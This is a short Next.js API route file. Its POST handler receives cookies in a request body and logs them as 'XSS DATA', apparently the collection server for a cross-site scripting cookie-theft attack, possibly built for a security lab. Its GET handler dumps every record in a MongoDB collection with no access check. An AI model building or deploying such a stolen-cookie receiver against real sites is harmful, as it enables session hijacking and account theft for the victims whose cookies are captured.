import { NextResponse } from "next/server";
import clientPromise from "@/lib/mongodb";

export async function GET() {
    try {
        const client = await clientPromise;
        const db = client.db("Kemjar");
        const collection = db.collection("Kemjar");

        const data = await collection.find({}).toArray();

        return NextResponse.json(data);
    } catch (error) {
        console.error(error);
        return NextResponse.json({ error: "Failed to fetch data" }, { status: 500 });
    }
}

//post and console log the data
export async function POST(request: Request) {
    try {
        const { cookies } = await request.json();
        if (!cookies) {
            return NextResponse.json(
                { error: "cookies is Required" },
                { status: 400 }
            );
        }

        console.log("XSS DATA : ");
        console.table(cookies);

        return NextResponse.json({ success: true });
    } catch (error) {
        console.error(error);
        return NextResponse.json(
            { error: "Failed to read cookies" },
            { status: 500 }
        );
    }
}